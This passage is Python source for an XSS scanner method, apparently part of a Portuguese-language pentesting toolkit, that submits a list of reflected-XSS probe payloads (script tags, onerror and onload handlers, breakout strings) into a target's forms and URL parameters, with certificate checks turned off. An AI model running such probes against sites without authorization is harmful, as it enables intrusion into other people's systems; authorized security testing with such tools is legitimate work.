    def xss_scanner(self):
        """XSS Vulnerability Scanner"""
        self.clear_screen()
        print(f"{Colors.BOLD}{Colors.HEADER}  XSS VULNERABILITY SCANNER{Colors.END}")
        print(f"{Colors.BLUE}{'='*60}{Colors.END}\n")
        
        if not BS4_AVAILABLE:
            print(f"{Colors.RED}[-] BeautifulSoup não instalado. Instala com: pip install beautifulsoup4{Colors.END}")
            self.wait_for_enter()
            return
        
        target = self.get_target()
        
        print(f"{Colors.BOLD}A testar XSS em {target}...{Colors.END}")
        
        # Payloads XSS
        payloads = [
            ('<script>alert("XSS")</script>', 'Script básico'),
            ('<img src=x onerror=alert("XSS")>', 'Image onerror'),
            ('<svg onload=alert("XSS")>', 'SVG onload'),
            ('"><script>alert("XSS")</script>', 'Breakout'),
            ('\';alert("XSS");//', 'Semicolon'),
            ('<ScRiPt>alert("XSS")</ScRiPt>', 'Case mix')
        ]
        
        vulnerabilities = []
        
        try:
            # Obter página
            response = self.session.get(target, timeout=10, verify=False)
            soup = BeautifulSoup(response.text, 'html.parser')
            
            # Encontrar formulários
            forms = soup.find_all('form')
            print(f"Formulários encontrados: {len(forms)}")
            
            for form in forms:
                action = form.get('action', '')
                method = form.get('method', 'get').lower()
                form_url = urljoin(target, action)
                
                inputs = form.find_all(['input', 'textarea'])
                input_names = [i.get('name') for i in inputs if i.get('name')]
                
                for payload, desc in payloads:
                    data = {name: payload for name in input_names}
                    
                    try:
                        if method == 'post':
                            r = self.session.post(form_url, data=data, verify=False, timeout=5)
                        else:
                            r = self.session.get(form_url, params=data, verify=False, timeout=5)
                        
                        if payload in r.text:
                            print(f"{Colors.RED}[XSS ENCONTRADO]{Colors.END} {desc}")
                            print(f"  URL: {form_url}")
                            print(f"  Payload: {payload}")
                            vulnerabilities.append({
                                'type': desc,
                                'url': form_url,
                                'payload': payload,
                                'inputs': input_names
                            })
                            break
                    except:
                        pass
            
            # Testar parâmetros URL
            if '?' in target:
                base_url = target.split('?')[0]
                params = target.split('?')[1].split('&')
                
                for param in params:
                    if '=' in param:
                        param_name = param.split('=')[0]
                        
                        for payload, desc in payloads:
                            test_url = f"{base_url}?{param_name}={quote_plus(payload)}"
                            try:
                                r = self.session.get(test_url, verify=False, timeout=5)
                                if payload in r.text:
                                    print(f"{Colors.RED}[XSS ENCONTRADO]{Colors.END} {desc} no parâmetro {param_name}")
                                    vulnerabilities.append({
                                        'type': desc,
                                        'url': test_url,
                                        'payload': payload,
                                        'parameter': param_name
                                    })
                                    break
                            except:
                                pass
            
            if not vulnerabilities:
                print(f"{Colors.GREEN}[+] Nenhuma vulnerabilidade XSS encontrada{Colors.END}")
            
        except Exception as e:
            print(f"{Colors.RED}[-] Erro: {e}{Colors.END}")
        
        # Guardar resultados
        self.save_report('xss_scan', {
            'target': target,
            'vulnerabilities': vulnerabilities
        })
        
        self.wait_for_enter()
